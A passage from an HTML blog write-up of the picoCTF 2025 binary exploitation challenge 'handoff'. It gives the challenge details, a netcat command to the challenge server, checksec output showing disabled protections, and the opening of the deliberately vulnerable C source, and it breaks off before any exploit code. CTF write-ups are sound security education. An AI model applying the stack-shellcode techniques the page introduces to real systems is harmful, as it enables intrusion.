@@ -1,0 +1,618 @@
+<!DOCTYPE html><html lang="en" class="scroll-smooth" data-astro-cid-sckkx6r4> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><link rel="canonical" href="https://e27ec68b.exfuturo.pages.dev/posts/pico-ctf-2025/handoff/picoctf-2025-handoff/"><meta name="generator" content="Astro v5.5.2"><!-- General Meta Tags --><title>picoCTF 2025 - handoff | ex futuro</title><meta name="title" content="picoCTF 2025 - handoff | ex futuro"><meta name="description" content="A writeup for the binary exploitation challenge handoff"><meta name="author" content="Viraj Singh"><link rel="sitemap" href="/sitemap-index.xml"><!-- Open Graph / Facebook --><meta property="og:title" content="picoCTF 2025 - handoff | ex futuro"><meta property="og:description" content="A writeup for the binary exploitation challenge handoff"><meta property="og:url" content="https://e27ec68b.exfuturo.pages.dev/posts/pico-ctf-2025/handoff/picoctf-2025-handoff/"><meta property="og:image" content="https://e27ec68b.exfuturo.pages.dev/posts/pico-ctf-2025/handoff/picoctf-2025-handoff/index.png"><!-- Social Media --><meta property="og:type" content="website"><meta property="og:site_name" content="ex futuro"><meta property="og:locale" content="en"><!-- Article Published/Modified time --><meta property="article:published_time" content="2025-03-21T01:17:05.000Z"><meta property="article:modified_time" content="2025-03-21T01:17:05.000Z"><!-- Google JSON-LD Structured data --><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"picoCTF 2025 - handoff | ex futuro","image":"https://e27ec68b.exfuturo.pages.dev/posts/pico-ctf-2025/handoff/picoctf-2025-handoff/index.png","datePublished":"2025-03-21T01:17:05.000Z","dateModified":"2025-03-21T01:17:05.000Z","author":[{"@type":"Person","name":"Viraj Singh","url":"https://github.com/vsingh21"}]}</script><!-- Enable RSS feed auto-discovery  --><!-- https://docs.astro.build/en/recipes/rss/#enabling-rss-feed-auto-discovery --><link rel="alternate" type="application/rss+xml" title="ex futuro" href="https://e27ec68b.exfuturo.pages.dev/rss.xml"><meta name="theme-color" content=""><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="animate"><script type="module" src="/_astro/ClientRouter.astro_astro_type_script_index_0_lang.CMTcOisY.js"></script><script src="/toggle-theme.js"></script><link rel="stylesheet" href="/_astro/about.DpL_unq9.css">
+<style>@keyframes astroFadeInOut{0%{opacity:1}to{opacity:0}}@keyframes astroFadeIn{0%{opacity:0;mix-blend-mode:plus-lighter}to{opacity:1;mix-blend-mode:plus-lighter}}@keyframes astroFadeOut{0%{opacity:1;mix-blend-mode:plus-lighter}to{opacity:0;mix-blend-mode:plus-lighter}}@keyframes astroSlideFromRight{0%{transform:translate(100%)}}@keyframes astroSlideFromLeft{0%{transform:translate(-100%)}}@keyframes astroSlideToRight{to{transform:translate(100%)}}@keyframes astroSlideToLeft{to{transform:translate(-100%)}}@media (prefers-reduced-motion){::view-transition-group(*),::view-transition-old(*),::view-transition-new(*){animation:none!important}[data-astro-transition-scope]{animation:none!important}}
+[data-astro-image]{width:100%;height:auto;object-fit:var(--fit);object-position:var(--pos);aspect-ratio:var(--w) / var(--h)}[data-astro-image=responsive]{max-width:calc(var(--w) * 1px);max-height:calc(var(--h) * 1px)}[data-astro-image=fixed]{width:calc(var(--w) * 1px);height:calc(var(--h) * 1px)}
+</style><style>[data-astro-transition-scope="astro-fam6wyqg-1"] { view-transition-name: pico-ctf-2025-handoff; }@layer astro { ::view-transition-old(pico-ctf-2025-handoff) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }::view-transition-new(pico-ctf-2025-handoff) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back]::view-transition-old(pico-ctf-2025-handoff) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back]::view-transition-new(pico-ctf-2025-handoff) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-fam6wyqg-1"],
+			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-fam6wyqg-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-fam6wyqg-1"],
+			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-fam6wyqg-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-fam6wyqg-1"],
+			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-fam6wyqg-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-fam6wyqg-1"],
+			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-fam6wyqg-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }</style><style>[data-astro-transition-scope="astro-36ssibgs-2"] { view-transition-name: pwn; }@layer astro { ::view-transition-old(pwn) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }::view-transition-new(pwn) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back]::view-transition-old(pwn) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back]::view-transition-new(pwn) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-36ssibgs-2"],
+			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-36ssibgs-2"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-36ssibgs-2"],
+			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-36ssibgs-2"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-36ssibgs-2"],
+			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-36ssibgs-2"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-36ssibgs-2"],
+			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-36ssibgs-2"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }</style><style>[data-astro-transition-scope="astro-36ssibgs-3"] { view-transition-name: rev; }@layer astro { ::view-transition-old(rev) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }::view-transition-new(rev) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back]::view-transition-old(rev) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back]::view-transition-new(rev) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-36ssibgs-3"],
+			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-36ssibgs-3"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-36ssibgs-3"],
+			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-36ssibgs-3"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-36ssibgs-3"],
+			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-36ssibgs-3"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-36ssibgs-3"],
+			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-36ssibgs-3"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }</style><style>[data-astro-transition-scope="astro-36ssibgs-4"] { view-transition-name: pico-ctf-2025; }@layer astro { ::view-transition-old(pico-ctf-2025) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }::view-transition-new(pico-ctf-2025) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back]::view-transition-old(pico-ctf-2025) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back]::view-transition-new(pico-ctf-2025) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-36ssibgs-4"],
+			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-36ssibgs-4"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-36ssibgs-4"],
+			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-36ssibgs-4"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-36ssibgs-4"],
+			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-36ssibgs-4"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-36ssibgs-4"],
+			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-36ssibgs-4"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }</style><style>[data-astro-transition-scope="astro-36ssibgs-5"] { view-transition-name: pico-ctf; }@layer astro { ::view-transition-old(pico-ctf) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }::view-transition-new(pico-ctf) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back]::view-transition-old(pico-ctf) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back]::view-transition-new(pico-ctf) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-36ssibgs-5"],
+			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-36ssibgs-5"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-36ssibgs-5"],
+			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-36ssibgs-5"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-36ssibgs-5"],
+			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-36ssibgs-5"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-36ssibgs-5"],
+			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-36ssibgs-5"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }</style></head> <body data-astro-cid-sckkx6r4>  <header> <a id="skip-to-content" href="#main-content" class="absolute -top-full left-16 z-50 bg-background px-3 py-2 text-accent backdrop-blur-lg transition-all focus:top-4">
+Skip to content
+</a> <div id="nav-container" class="mx-auto flex max-w-3xl flex-col items-center justify-between sm:flex-row"> <div id="top-nav-wrap" class="relative flex w-full items-baseline justify-between bg-background p-4 sm:py-6"> <a href="/" class="absolute py-1 text-2xl leading-7 font-semibold whitespace-nowrap sm:static"> ex futuro </a> <nav id="nav-menu" class="flex w-full flex-col items-center sm:ml-2 sm:flex-row sm:justify-end sm:space-x-4 sm:py-0"> <button id="menu-btn" class="focus-outline self-end p-2 sm:hidden" aria-label="Open Menu" aria-expanded="false" aria-controls="menu-items"> <svg viewBox="0 0 24 24" role="img"  width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="hidden" id="close-icon"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M18 6l-12 12" /><path d="M6 6l12 12" /></svg> <svg viewBox="0 0 24 24" role="img"  width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-menu-deep" id="menu-icon"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M4 6h16" /><path d="M7 12h13" /><path d="M10 18h10" /></svg> </button> <ul id="menu-items" class="mt-4 grid w-44 grid-cols-2 place-content-center gap-2 [&#38;>li>a]:block [&#38;>li>a]:px-4 [&#38;>li>a]:py-3 [&#38;>li>a]:text-center [&#38;>li>a]:font-medium [&#38;>li>a]:hover:text-accent sm:[&#38;>li>a]:px-2 sm:[&#38;>li>a]:py-1 hidden sm:mt-0 sm:ml-0 sm:flex sm:w-auto sm:gap-x-5 sm:gap-y-0"> <li class="col-span-2"> <a href="/posts" class="active-nav">
+Posts
+</a> </li> <li class="col-span-2"> <a href="/tags">
+Tags
+</a> </li> <li class="col-span-2"> <a href="/about">
+About
+</a> </li> <li class="col-span-2"> <a href="/archives" class="group inline-block hover:text-accent focus-outline flex justify-center p-3 sm:p-1" aria-label="archives" title="Archives"> <svg viewBox="0 0 24 24" role="img"  width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="hidden sm:inline-block"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M3 4m0 2a2 2 0 0 1 2 -2h14a2 2 0 0 1 2 2v0a2 2 0 0 1 -2 2h-14a2 2 0 0 1 -2 -2z" /><path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" /><path d="M10 12l4 0" /></svg> <span class="sm:sr-only">Archives</span> </a> </li> <li class="col-span-1 flex items-center justify-center"> <a href="/search" class="group inline-block hover:text-accent focus-outline flex p-3 sm:p-1" aria-label="search" title="Search"> <svg viewBox="0 0 24 24" role="img"  width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-search"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M10 10m-7 0a7 7 0 1 0 14 0a7 7 0 1 0 -14 0" /><path d="M21 21l-6 -6" /></svg> <span class="sr-only">Search</span> </a> </li> <li class="col-span-1 flex items-center justify-center"> <button id="theme-btn" class="focus-outline relative size-12 p-4 sm:size-8 hover:[&>svg]:stroke-accent" title="Toggles light & dark" aria-label="auto" aria-live="polite"> <svg viewBox="0 0 24 24" role="img"  width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="absolute top-[50%] left-[50%] -translate-[50%] scale-100 rotate-0 transition-all dark:scale-0 dark:-rotate-90"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z" /></svg> <svg viewBox="0 0 24 24" role="img"  width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="absolute top-[50%] left-[50%] -translate-[50%] scale-0 rotate-90 transition-all dark:scale-100 dark:rotate-0"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M14.828 14.828a4 4 0 1 0 -5.656 -5.656a4 4 0 0 0 5.656 5.656z" /><path d="M6.343 17.657l-1.414 1.414" /><path d="M6.343 6.343l-1.414 -1.414" /><path d="M17.657 6.343l1.414 -1.414" /><path d="M17.657 17.657l1.414 1.414" /><path d="M4 12h-2" /><path d="M12 4v-2" /><path d="M20 12h2" /><path d="M12 20v2" /></svg> </button> </li> </ul> </nav> </div> </div> <div class="max-w-3xl mx-auto px-4"> <hr class="border-border" aria-hidden="true"> </div> </header> <script type="module">function s(){const e=document.querySelector("#menu-btn"),t=document.querySelector("#menu-items"),n=document.querySelector("#menu-icon"),o=document.querySelector("#close-icon");!e||!t||!n||!o||e.addEventListener("click",()=>{const c=e.getAttribute("aria-expanded")==="true";e.setAttribute("aria-expanded",c?"false":"true"),e.setAttribute("aria-label",c?"Open Menu":"Close Menu"),t.classList.toggle("hidden"),n.classList.toggle("hidden"),o.classList.toggle("hidden")})}s();document.addEventListener("astro:after-swap",s);</script> <div class="mx-auto flex w-full max-w-3xl items-center justify-start px-2"><a id="back-button" href="/" class="group inline-block hover:text-accent focus-outline mt-8 mb-2 flex hover:text-foreground/75"><svg viewBox="0 0 24 24" role="img"  width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M15 6l-6 6l6 6" /></svg><span>Go back</span></a></div><script type="module">function o(){const t=document.querySelector("#back-button"),e=sessionStorage.getItem("backUrl");e&&t&&(t.href=e)}document.addEventListener("astro:page-load",o);o();</script> <main id="main-content" class="mx-auto w-full max-w-3xl px-4 pb-12" data-pagefind-body> <h1 class="inline-block text-2xl font-bold text-accent sm:text-3xl" data-astro-transition-scope="astro-fam6wyqg-1"> picoCTF 2025 - handoff </h1> <div class="text-sm text-gray-500 dark:text-gray-400 mb-2">
+by Viraj Singh </div> <div class="flex items-center gap-4"> <div class="flex items-end space-x-2 opacity-80 my-2"> <svg xmlns="http://www.w3.org/2000/svg" class="scale-100 inline-block h-6 w-6 min-w-[1.375rem] fill-foreground" aria-hidden="true"> <path d="M7 11h2v2H7zm0 4h2v2H7zm4-4h2v2h-2zm0 4h2v2h-2zm4-4h2v2h-2zm0 4h2v2h-2z"></path> <path d="M5 22h14c1.103 0 2-.897 2-2V6c0-1.103-.897-2-2-2h-2V2h-2v2H9V2H7v2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2zM19 8l.001 12H5V8h14z"></path> </svg> <span class="sr-only">Published:</span> <span class="italic text-sm sm:text-base"> <time datetime="2025-03-21T01:17:05.000Z">Mar 20, 2025</time> <span aria-hidden="true"> | </span> <span class="sr-only">&nbsp;at&nbsp;</span> <span class="text-nowrap">09:17 PM</span> </span> </div>  </div> <article id="article" class="mx-auto prose mt-8 max-w-3xl"> <h2 id="table-of-contents">Table of contents</h2>
+<p></p><details><summary>Open Table of contents</summary><p></p>
+<ul>
+<li><a href="#challenge-information">Challenge-Information</a></li>
+<li><a href="#explanation">Explanation</a>
+<ul>
+<li><a href="#securities">Securities</a></li>
+<li><a href="#analyze-the-c-file">Analyze the C file</a></li>
+<li><a href="#shellcode-injection">Shellcode Injection</a></li>
+<li><a href="#stack-inspection">Stack Inspection</a></li>
+<li><a href="#jumping-to-shellcode">Jumping to Shellcode</a></li>
+</ul>
+</li>
+<li><a href="#summary">Summary</a></li>
+<li><a href="#full-solution">Full-Solution</a></li>
+<li><a href="#references">References</a></li>
+</ul>
+<p></p></details><p></p>
+<h2 id="challenge-information">Challenge-Information</h2>
+<p>400 Points</p>
+<p>Tags: picoCTF 2025, Binary Exploitation, browser_webshell_solvable</p>
+<p>Author: SKRUBLAWD</p>
+<p>Description:</p>
+<p>Download the binary <a href="https://challenge-files.picoctf.net/c_shape_facility/2a2a522d05c967aadd33a7d06e77d42a4efcdeb62d0cc40b046d355beb582d7b/handoff">here</a></p>
+<p>Download the source <a href="https://challenge-files.picoctf.net/c_shape_facility/2a2a522d05c967aadd33a7d06e77d42a4efcdeb62d0cc40b046d355beb582d7b/handoff.c">here</a></p>
+<p>Connect to the program with netcat:</p>
+<p><code>$ nc shape-facility.picoctf.net 50924</code></p>
+<p>Challenge Link: <a href="https://play.picoctf.org/practice/challenge/486">https://play.picoctf.org/practice/challenge/486</a></p>
+<h2 id="explanation">Explanation</h2>
+<h3 id="securities">Securities</h3>
+<p>Before we start we can look at the securities enabled using <code>checksec</code>:</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">└─$</span><span style="color:#2B5581;--shiki-dark:#ECC48D"> checksec</span><span style="color:#2B5581;--shiki-dark:#82AAFF"> --file=handoff</span></span>
+<span class="line"><span style="color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">RELRO</span><span style="color:#2B5581;--shiki-dark:#ECC48D">           STACK</span><span style="color:#2B5581;--shiki-dark:#ECC48D"> CANARY</span><span style="color:#2B5581;--shiki-dark:#ECC48D">      NX</span><span style="color:#2B5581;--shiki-dark:#ECC48D">            PIE</span><span style="color:#2B5581;--shiki-dark:#ECC48D">             RPATH</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">      </span></span>
+<span class="line"><span style="color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">Partial</span><span style="color:#2B5581;--shiki-dark:#ECC48D"> RELRO</span><span style="color:#2B5581;--shiki-dark:#ECC48D">   No</span><span style="color:#2B5581;--shiki-dark:#ECC48D"> canary</span><span style="color:#2B5581;--shiki-dark:#ECC48D"> found</span><span style="color:#2B5581;--shiki-dark:#ECC48D">   NX</span><span style="color:#2B5581;--shiki-dark:#ECC48D"> disabled</span><span style="color:#2B5581;--shiki-dark:#ECC48D">   No</span><span style="color:#2B5581;--shiki-dark:#ECC48D"> PIE</span><span style="color:#2B5581;--shiki-dark:#ECC48D">          No</span><span style="color:#2B5581;--shiki-dark:#ECC48D"> RPATH</span></span></code></pre>
+<p>* I omitted irrelevant information from the <code>checksec</code> output</p>
+<h3 id="analyze-the-c-file">Analyze the C file</h3>
+<p>We start by analyzing the C source code.</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#D32F2F;--shiki-dark:#C792EA">#</span><span style="color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">include</span><span style="color:#22863A;--shiki-dark:#D9F5DD"> &#x3C;</span><span style="color:#22863A;--shiki-dark:#ECC48D">stdio.h</span><span style="color:#22863A;--shiki-dark:#D9F5DD">></span></span>
+<span class="line"><span style="color:#D32F2F;--shiki-dark:#C792EA">#</span><span style="color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">include</span><span style="color:#22863A;--shiki-dark:#D9F5DD"> &#x3C;</span><span style="color:#22863A;--shiki-dark:#ECC48D">stdlib.h</span><span style="color:#22863A;--shiki-dark:#D9F5DD">></span></span>
+<span class="line"><span style="color:#D32F2F;--shiki-dark:#C792EA">#</span><span style="color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">include</span><span style="color:#22863A;--shiki-dark:#D9F5DD"> &#x3C;</span><span style="color:#22863A;--shiki-dark:#ECC48D">stdbool.h</span><span style="color:#22863A;--shiki-dark:#D9F5DD">></span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#D32F2F;--shiki-dark:#C792EA">#</span><span style="color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">define</span><span style="color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic"> MAX_ENTRIES</span><span style="color:#1976D2;--shiki-dark:#F78C6C"> 10</span></span>
+<span class="line"><span style="color:#D32F2F;--shiki-dark:#C792EA">#</span><span style="color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">define</span><span style="color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic"> NAME_LEN</span><span style="color:#1976D2;--shiki-dark:#F78C6C"> 32</span></span>
+<span class="line"><span style="color:#D32F2F;--shiki-dark:#C792EA">#</span><span style="color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">define</span><span style="color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic"> MSG_LEN</span><span style="color:#1976D2;--shiki-dark:#F78C6C"> 64</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#D32F2F;--shiki-dark:#C792EA">typedef</span><span style="color:#D32F2F;--shiki-dark:#C792EA"> struct</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB"> entry {</span></span>
+<span class="line"><span style="color:#D32F2F;--shiki-dark:#C792EA">	char</span><span style="color:#24292EFF;--shiki-dark:#C5E478"> name</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">[</span><span style="color:#1976D2;--shiki-dark:#F78C6C">8</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">];</span></span>
+<span class="line"><span style="color:#D32F2F;--shiki-dark:#C792EA">	char</span><span style="color:#24292EFF;--shiki-dark:#C5E478"> msg</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">[</span><span style="color:#1976D2;--shiki-dark:#F78C6C">64</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">];</span></span>
+<span class="line"><span style="color:#24292EFF;--shiki-dark:#D6DEEB">} </span><span style="color:#1976D2;--shiki-dark:#C5E478">entry_t</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#D32F2F;--shiki-dark:#C792EA">void</span><span style="color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic"> print_menu</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">() {</span></span>
